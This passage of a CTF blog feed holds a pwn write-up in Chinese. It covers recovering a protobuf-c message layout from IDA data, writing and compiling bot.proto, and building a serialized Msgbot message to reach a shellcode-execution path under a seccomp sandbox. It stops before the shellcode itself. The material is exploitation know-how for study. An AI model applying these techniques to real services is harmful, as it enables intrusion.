class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目：&lt;a href=&quot;https://github.com/0xviol1t/CTF-challenges/tree/main/2024/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/pwn&quot;&gt;https://github.com/0xviol</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>只能接受特定格式的msgbot-protobuf+可见字符shellcode</title>
    <link href="https://starrysky1004.github.io/2024/10/13/zhi-neng-jie-shou-te-ding-ge-shi-de-msgbot-protobuf-ke-jian-zi-fu-shellcode/zhi-neng-jie-shou-te-ding-ge-shi-de-msgbot-protobuf-ke-jian-zi-fu-shellcode/"/>
    <id>https://starrysky1004.github.io/2024/10/13/zhi-neng-jie-shou-te-ding-ge-shi-de-msgbot-protobuf-ke-jian-zi-fu-shellcode/zhi-neng-jie-shou-te-ding-ge-shi-de-msgbot-protobuf-ke-jian-zi-fu-shellcode/</id>
    <published>2024-10-13T07:37:04.000Z</published>
    <updated>2025-01-14T09:59:07.194Z</updated>
    
    <content type="html"><![CDATA[<p>本题来源于源鲁杯第一轮<code>pwn</code>的困难题，向程序发送了<code>msg</code>之后会判定是否符合<code>proto</code>结构，符合则开启沙箱仅允许执行<code>read、write、fstat、alarm、exit_group</code>，并执行<code>msg</code>里的<code>shellcode</code>，<code>shellcode</code>要求范围在可见字符且长度不大于<code>0xc7</code></p><h2 id="protobuf结构体"><a href="#protobuf结构体" class="headerlink" title="protobuf结构体"></a>protobuf结构体</h2><h3 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="protobuf结构体-x2F-proto文件示例"><a href="#protobuf结构体-x2F-proto文件示例" class="headerlink" title="protobuf结构体&#x2F;proto文件示例"></a>protobuf结构体&#x2F;proto文件示例</h4><p><code>protobuf</code>结构体示例：<code>device.proto</code>，由<code>protobuf</code>版本（<code>proto2 / proto3</code>）和<code>protobuf</code>结构体构成</p><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto2"</span><span class="token punctuation">;</span><span class="token keyword">message</span> <span class="token class-name">devicemsg</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">required</span> <span class="token builtin">sint64</span> actionid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">required</span> <span class="token builtin">sint64</span> msgidx <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">required</span> <span class="token builtin">sint64</span> msgsize <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token keyword">required</span> <span class="token builtin">bytes</span>  msgcontent <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="protobuf参数的结构体定义"><a href="#protobuf参数的结构体定义" class="headerlink" title="protobuf参数的结构体定义"></a>protobuf参数的结构体定义</h4><p><code>protobuf</code>参数的结构体定义如下，其中需要注意的是前四项，在<code>.data.rel.ro</code>段中可以看到每个参数的结构体，根据结构体中的值判断参数类型等信息，从而分析得到<code>protobuf</code>结构体</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">ProtobufCFieldDescriptor</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token class-name">uint32_t</span>id<span class="token punctuation">;</span>ProtobufCLabel  label<span class="token punctuation">;</span>ProtobufCTypetype<span class="token punctuation">;</span><span class="token keyword">unsigned</span>quantifier_offset<span class="token punctuation">;</span><span class="token keyword">unsigned</span>offset<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span>descriptor<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span>default_value<span class="token punctuation">;</span><span class="token class-name">uint32_t</span>flags<span class="token punctuation">;</span><span class="token keyword">unsigned</span>reserved_flags<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token operator">*</span>reserved2<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token operator">*</span>reserved3<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以示例中的<code>required sint64 actionid = 1;</code>为例，分别对应结构体前四项：<code>name</code>值为<code>actionid</code>，<code>id</code>值为<code>1</code>，<code>label</code>值为<code>required</code>，<code>type</code>值为<code>sint64</code>，<strong>即在编写<code>proto</code>文件时是按照<code>label type name = id</code>的顺序写的</strong></p><p><code>label</code>存在以下类型，即<code>required</code>、<code>optional</code>、<code>repeated</code>、<code>none</code>，从单词含义也能看出对应什么类型，他们表现在<code>.data.rel.ro</code>中的数值是按枚举顺序<code>0-3</code>，**只有版本为<code>proto2</code>时才需要考虑<code>label</code>**，<code>proto3</code>的<code>label</code>都是<code>none</code>（即数值为<code>3</code>）且不需要在<code>proto</code>文件中写出来</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>PROTOBUF_C_LABEL_REQUIRED<span class="token punctuation">,</span>PROTOBUF_C_LABEL_OPTIONAL<span class="token punctuation">,</span>PROTOBUF_C_LABEL_REPEATED<span class="token punctuation">,</span>PROTOBUF_C_LABEL_NONE<span class="token punctuation">,</span><span class="token punctuation">&#125;</span> ProtobufCLabel<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>type</code>存在以下类型，他们表现在<code>.data.rel.ro</code>中的数值是按枚举顺序<code>0-0x10</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>PROTOBUF_C_TYPE_INT32<span class="token punctuation">,</span>      <span class="token comment">/**&lt; int32 */</span>PROTOBUF_C_TYPE_SINT32<span class="token punctuation">,</span>     <span class="token comment">/**&lt; signed int32 */</span>PROTOBUF_C_TYPE_SFIXED32<span class="token punctuation">,</span>   <span class="token comment">/**&lt; signed int32 (4 bytes) */</span>PROTOBUF_C_TYPE_INT64<span class="token punctuation">,</span>      <span class="token comment">/**&lt; int64 */</span>PROTOBUF_C_TYPE_SINT64<span class="token punctuation">,</span>     <span class="token comment">/**&lt; signed int64 */</span>PROTOBUF_C_TYPE_SFIXED64<span class="token punctuation">,</span>   <span class="token comment">/**&lt; signed int64 (8 bytes) */</span>PROTOBUF_C_TYPE_UINT32<span class="token punctuation">,</span>     <span class="token comment">/**&lt; unsigned int32 */</span>PROTOBUF_C_TYPE_FIXED32<span class="token punctuation">,</span>    <span class="token comment">/**&lt; unsigned int32 (4 bytes) */</span>PROTOBUF_C_TYPE_UINT64<span class="token punctuation">,</span>     <span class="token comment">/**&lt; unsigned int64 */</span>PROTOBUF_C_TYPE_FIXED64<span class="token punctuation">,</span>    <span class="token comment">/**&lt; unsigned int64 (8 bytes) */</span>PROTOBUF_C_TYPE_FLOAT<span class="token punctuation">,</span>      <span class="token comment">/**&lt; float */</span>PROTOBUF_C_TYPE_DOUBLE<span class="token punctuation">,</span>     <span class="token comment">/**&lt; double */</span>PROTOBUF_C_TYPE_BOOL<span class="token punctuation">,</span>       <span class="token comment">/**&lt; boolean */</span>PROTOBUF_C_TYPE_ENUM<span class="token punctuation">,</span>       <span class="token comment">/**&lt; enumerated type */</span>PROTOBUF_C_TYPE_STRING<span class="token punctuation">,</span>     <span class="token comment">/**&lt; UTF-8 or ASCII string */</span>PROTOBUF_C_TYPE_BYTES<span class="token punctuation">,</span>      <span class="token comment">/**&lt; arbitrary byte sequence */</span>PROTOBUF_C_TYPE_MESSAGE<span class="token punctuation">,</span>    <span class="token comment">/**&lt; nested message */</span><span class="token punctuation">&#125;</span> ProtobufCType<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="判定protobuf版本"><a href="#判定protobuf版本" class="headerlink" title="判定protobuf版本"></a>判定protobuf版本</h4><ul><li><p>根据结构体参数数量和实际数量是否一致判断</p><p>在<code>.data.rel.ro</code>段的结构体名下面两项分别是结构体大小和结构体参数数量，<code>proto2</code>比<code>proto3</code>多了<code>default_value</code>字段，所以参数数量会比实际参数数量多一个</p></li><li><p>根据参数结构体有无<code>label</code></p><p><code>proto2</code>中必须声明参数的<code>label</code>，所以<code>label</code>值存在除<code>none</code>（即<code>3</code>）以外的值就是<code>proto2</code></p></li></ul><h4 id="编译proto文件"><a href="#编译proto文件" class="headerlink" title="编译proto文件"></a>编译proto文件</h4><p>使用<code>python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. filename.proto</code>来编译<code>filename.proto</code>，需要先安装<code>grpcio-tools</code>，编译后得到<code>filename_pb2.py</code>和<code>filename_pb2_grpc.py</code>，编译后在<code>exp</code>中导入<code>filename_pb2</code>即可使用结构体来发送消息</p><p>编译后的结构体会比原结构体多<code>ProtobufCMessage base;</code>，<code>ProtobufCMessage</code>结构体定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">ProtobufCMessage</span> <span class="token punctuation">&#123;</span><span class="token keyword">const</span> ProtobufCMessageDescriptor<span class="token operator">*</span>descriptor<span class="token punctuation">;</span><span class="token keyword">unsigned</span>n_unknown_fields<span class="token punctuation">;</span>ProtobufCMessageUnknownField<span class="token operator">*</span>unknown_fields<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>所以编译后我们定义的参数在数组中的下标是从<code>3</code>开始的</strong></p><h4 id="使用pbtk获取protobuf结构体"><a href="#使用pbtk获取protobuf结构体" class="headerlink" title="使用pbtk获取protobuf结构体"></a>使用pbtk获取protobuf结构体</h4><p>工具地址：<a href="https://github.com/marin-m/pbtk">https://github.com/marin-m/pbtk</a></p><p>使用工具可以快速获取<code>protobuf</code>结构体省去手搓<code>proto</code>文件的麻烦，安装的时候有报错可以直接问<code>gpt</code>解决，但是有的题目被作者刻意隐藏了<code>protobuf</code>特征而无法用工具梭，还是需要手搓</p><h3 id="结构体分析"><a href="#结构体分析" class="headerlink" title="结构体分析"></a>结构体分析</h3><p>在<code>IDA</code>中找到了<code>_data_rel_ro</code>段，<code>name</code>在<code>;</code>右边，下面第一个数值为<code>id</code>，<code>2-5</code>是<code>label</code>，<code>6-9</code>是<code>type</code>，对应枚举中的类型可以得到结构体参数的类型，这里一共有<code>msgid</code>、<code>msgsize</code>、<code>msgcontent</code>三个参数，而<code>qword_3C60</code>结构体名称下面的结构体参数数量也是<code>3</code>，所以<code>protobuf</code>版本为<code>proto3</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80 _data_rel_ro    segment align_32 public <span class="token char">'DATA'</span> use64<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80                 assume cs<span class="token operator">:</span>_data_rel_ro<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80                 <span class="token punctuation">;</span>org <span class="token number">3</span>B80h<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80 off_3B80        dq offset aMsgid        <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> <span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C98↓o<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B80                                         <span class="token punctuation">;</span> <span class="token string">"msgid"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B88                 db    <span class="token number">1</span>#id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B89                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8A                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8B                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8C                 db    <span class="token number">3</span>#label<span class="token operator">=</span>none<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8D                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8E                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B8F                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>B90                 db    <span class="token number">3</span>#type<span class="token operator">=</span>int64<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BC8                 dq offset aMsgsize      <span class="token punctuation">;</span> <span class="token string">"msgsize"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD0                 db    <span class="token number">2</span>#id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD1                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD2                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD3                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD4                 db    <span class="token number">3</span>#label<span class="token operator">=</span>none<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD5                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD6                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD7                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>BD8                 db    <span class="token number">3</span>#type<span class="token operator">=</span>int64<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C10                 dq offset aMsgcontent   <span class="token punctuation">;</span> <span class="token string">"msgcontent"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C18                 db    <span class="token number">3</span>#id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C19                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1A                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1B                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1C                 db    <span class="token number">3</span>#label<span class="token operator">=</span>none<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1D                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1E                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C1F                 db    <span class="token number">0</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C20                 db  <span class="token number">0F</span>h#type<span class="token operator">=</span>bytes<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C60 qword_3C60      dq <span class="token number">28</span>AAEEF9h            <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> sub_1819<span class="token operator">+</span><span class="token number">10</span>↑o<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C60                                         <span class="token punctuation">;</span> sub_187D<span class="token operator">+</span><span class="token number">17</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C68                 dq offset aBotMsgbot    <span class="token punctuation">;</span> <span class="token string">"bot.msgbot"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C70                 dq offset aMsgbot       <span class="token punctuation">;</span> <span class="token string">"Msgbot"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C78                 dq offset aBotMsgbot_0  <span class="token punctuation">;</span> <span class="token string">"Bot__Msgbot"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C80                 dq offset aBot          <span class="token punctuation">;</span> <span class="token string">"bot"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C88                 dq <span class="token number">38</span>h#结构体大小<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C90                 dq <span class="token number">3</span>#字段数<span class="token operator">=</span>实际字段数，是proto3<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>C98                 dq offset off_3B80      <span class="token punctuation">;</span> <span class="token string">"msgid"</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CA0                 dq offset unk_20A0<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CA8                 dq <span class="token number">1</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CB0                 dq offset unk_20B0<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>CB8                 dq offset sub_1819<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>D17 _data_rel_ro    ends<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000003</span>D17<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编写和编译proto文件"><a href="#编写和编译proto文件" class="headerlink" title="编写和编译proto文件"></a>编写和编译proto文件</h3><p>根据以上分析编写<code>bot.proto</code> 内容如下</p><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto3"</span><span class="token punctuation">;</span><span class="token keyword">message</span> <span class="token class-name">Msgbot</span><span class="token punctuation">&#123;</span>    <span class="token builtin">int64</span> msgid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token builtin">int64</span> msgsize <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token builtin">bytes</span> msgcontent <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. bot.proto</code>编译得到<code>bot_pb2.py</code>和<code>bot_pb2_grpc.py</code>，在<code>exp</code>中导入<code>bot_pb2</code>即可使用<code>bot_pb2</code>中的<code>Msgbot</code>来发送题目特定格式的消息，需要注意的是发送前需要先用<code>SerializeToString</code>序列化</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bot_pb2 <span class="token keyword">import</span> Msgbot<span class="token keyword">import</span> grpcmsg <span class="token operator">=</span> Msgbot<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>msgid <span class="token operator">=</span> <span class="token builtin">id</span>msg<span class="token punctuation">.</span>msgsize <span class="token operator">=</span> sizemsg<span class="token punctuation">.</span>msgcontent <span class="token operator">=</span> contentserialized <span class="token operator">=</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'botmsg'</span><span class="token punctuation">,</span> serialized<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>在发送的消息能被正确接收之后当<code>msg[0][3] == (void *)0xC0DEFEEDLL</code>且<code>msg[0][4] == (void *)0xF00DFACELL</code>、<code>msg[0][5] &lt;= 0xC7</code>时将<code>msg[0] + 6</code>复制到<code>dest</code>中作为<code>shellcode</code>执行，<code>msg[0][3]</code>就是<code>msgid</code>，<code>msg[0][4]</code>是<code>msgsize</code>，<code>msg[0] + 6</code>是<code>msgcontent</code>，<code>msg[0][5]</code>获取了<code>msgcontent</code>的长度</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0xC0DEFEEDLL</span> <span class="token operator">&amp;&amp;</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0xF00DFACELL</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v1<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seccomp</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v1<span class="token punctuation">,</span> v0<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_C0 <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">&amp;&amp;</span> v7 <span class="token operator">&lt;=</span> <span class="token number">0xC7</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dest<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以可以构造结构体如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bot_pb2 <span class="token 